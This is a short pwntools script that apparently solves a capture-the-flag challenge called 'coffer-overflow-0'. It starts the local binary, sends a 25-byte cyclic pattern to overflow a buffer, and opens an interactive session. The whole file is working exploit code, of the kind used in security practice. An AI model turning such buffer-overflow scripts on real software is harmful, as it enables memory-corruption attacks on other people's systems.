from pwn import *

io = process('./coffer-overflow-0')

payload = cyclic(25)

io.sendline(payload)
io.interactive()
